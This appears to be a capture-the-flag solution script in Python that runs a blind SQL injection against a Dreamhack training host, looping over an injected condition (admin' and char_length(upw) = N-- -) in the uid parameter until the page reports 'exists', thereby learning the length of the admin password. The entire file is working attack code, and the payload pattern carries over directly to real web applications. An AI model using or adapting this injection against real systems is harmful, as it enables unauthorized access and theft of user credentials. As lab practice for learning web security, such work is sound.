from requests import get
host = "http://host1.dreamhack.games:11777/"
password_length = 0
while True:
    password_length += 1
    query = f"admin' and char_length(upw) = {password_length}-- -"
    r = get(f"{host}/?uid={query}")
    if "exists" in r.text:
        break
print(f"password length: {password_length}")
